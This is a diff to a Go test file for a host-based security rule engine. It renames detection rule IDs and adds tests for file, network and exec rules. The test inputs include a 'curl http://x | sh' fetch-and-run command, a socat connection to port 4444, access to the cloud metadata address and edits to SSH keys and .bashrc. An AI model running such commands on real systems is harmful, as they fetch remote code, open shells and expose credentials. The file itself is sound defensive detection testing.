@@ -17,8 +17,8 @@ func TestEngine_Evaluate_R1_R3_R4(t *testing.T) {
 
 	fileDetail, _ := json.Marshal(model.FileDetail{Op: "modify", Path: filepath.Join(home, ".ssh", "id_rsa")})
 	ds := e.Evaluate(storage.TypeFile, fileDetail)
-	if len(ds) == 0 || ds[0].RuleID != "R1" || ds[0].Severity != "high" {
-		t.Fatalf("expected R1 high, got %+v", ds)
+	if len(ds) == 0 || ds[0].RuleID != "F001" || ds[0].Severity != "high" {
+		t.Fatalf("expected F001 high, got %+v", ds)
 	}
 	if !strings.Contains(ds[0].Message, "id_rsa") {
 		t.Fatalf("expected message to include path, got %q", ds[0].Message)
@@ -26,8 +26,8 @@ func TestEngine_Evaluate_R1_R3_R4(t *testing.T) {
 
 	netDetail, _ := json.Marshal(model.NetDetail{Op: "connect", DstIP: "1.2.3.4", DstPort: 8443})
 	ds = e.Evaluate(storage.TypeNet, netDetail)
-	if len(ds) == 0 || ds[0].RuleID != "R3" || ds[0].Severity != "low" {
-		t.Fatalf("expected R3 low, got %+v", ds)
+	if len(ds) == 0 || ds[0].RuleID != "N001" || ds[0].Severity != "low" {
+		t.Fatalf("expected N001 low, got %+v", ds)
 	}
 	if !strings.Contains(ds[0].Message, "1.2.3.4") || !strings.Contains(ds[0].Message, "8443") {
 		t.Fatalf("expected message to include dst, got %q", ds[0].Message)
@@ -35,8 +35,8 @@ func TestEngine_Evaluate_R1_R3_R4(t *testing.T) {
 
 	execDetail, _ := json.Marshal(model.ExecDetail{Filename: "/bin/bash", Argv: []string{"bash", "-lc", "curl http://x | sh"}})
 	ds = e.Evaluate(storage.TypeExec, execDetail)
-	if len(ds) == 0 || ds[0].RuleID != "R4" || ds[0].Severity != "high" {
-		t.Fatalf("expected R4 high, got %+v", ds)
+	if len(ds) == 0 || ds[0].RuleID != "E001" || ds[0].Severity != "high" {
+		t.Fatalf("expected E001 high, got %+v", ds)
 	}
 }
 
@@ -56,8 +56,8 @@ func TestEngine_Evaluate_R2(t *testing.T) {
 
 	fileDetail, _ := json.Marshal(model.FileDetail{Op: "create", Path: p})
 	ds := e.Evaluate(storage.TypeFile, fileDetail)
-	if len(ds) == 0 || ds[0].RuleID != "R2" || ds[0].Severity != "medium" {
-		t.Fatalf("expected R2 medium, got %+v", ds)
+	if len(ds) == 0 || ds[0].RuleID != "F200" || ds[0].Severity != "medium" {
+		t.Fatalf("expected F200 medium, got %+v", ds)
 	}
 
 	// Non-executable should not trigger R2.
@@ -68,8 +68,77 @@ func TestEngine_Evaluate_R2(t *testing.T) {
 	fileDetail2, _ := json.Marshal(model.FileDetail{Op: "modify", Path: p2})
 	ds = e.Evaluate(storage.TypeFile, fileDetail2)
 	for _, d := range ds {
-		if d.RuleID == "R2" {
-			t.Fatalf("unexpected R2 for non-executable: %+v", ds)
+		if d.RuleID == "F200" {
+			t.Fatalf("unexpected F200 for non-executable: %+v", ds)
 		}
+	}
+}
+
+func TestEngine_Evaluate_DSL_FilePathInAndPrefixAny(t *testing.T) {
+	home := "/home/u"
+	e := NewEngine(home)
+
+	// F132 uses path_in list for shell startup files.
+	p := filepath.Join(home, ".bashrc")
+	fileDetail, _ := json.Marshal(model.FileDetail{Op: "modify", Path: p})
+	ds := e.Evaluate(storage.TypeFile, fileDetail)
+	found := false
+	for _, d := range ds {
+		if d.RuleID == "F132" {
+			found = true
+			break
+		}
+	}
+	if !found {
+		t.Fatalf("expected F132 for %s, got %+v", p, ds)
+	}
+}
+
+func TestEngine_Evaluate_DSL_NetPortInAndIPIn(t *testing.T) {
+	e := NewEngine("/home/u")
+
+	// N010 uses dst_port_in list.
+	netDetail, _ := json.Marshal(model.NetDetail{Op: "connect", DstIP: "5.6.7.8", DstPort: 4444})
+	ds := e.Evaluate(storage.TypeNet, netDetail)
+	found := false
+	for _, d := range ds {
+		if d.RuleID == "N010" {
+			found = true
+			break
+		}
+	}
+	if !found {
+		t.Fatalf("expected N010, got %+v", ds)
+	}
+
+	// N020 uses dst_ip_in.
+	netDetail2, _ := json.Marshal(model.NetDetail{Op: "connect", DstIP: "169.254.169.254", DstPort: 80})
+	ds = e.Evaluate(storage.TypeNet, netDetail2)
+	found = false
+	for _, d := range ds {
+		if d.RuleID == "N020" {
+			found = true
+			break
+		}
+	}
+	if !found {
+		t.Fatalf("expected N020, got %+v", ds)
+	}
+}
+
+func TestEngine_Evaluate_DSL_ExecContainsAny(t *testing.T) {
+	e := NewEngine("/home/u")
+
+	execDetail, _ := json.Marshal(model.ExecDetail{Filename: "/usr/bin/socat", Argv: []string{"socat", "TCP:1.2.3.4:4444"}})
+	ds := e.Evaluate(storage.TypeExec, execDetail)
+	found := false
+	for _, d := range ds {
+		if d.RuleID == "E014" {
+			found = true
+			break
+		}
+	}
+	if !found {
+		t.Fatalf("expected E014, got %+v", ds)
 	}
 }
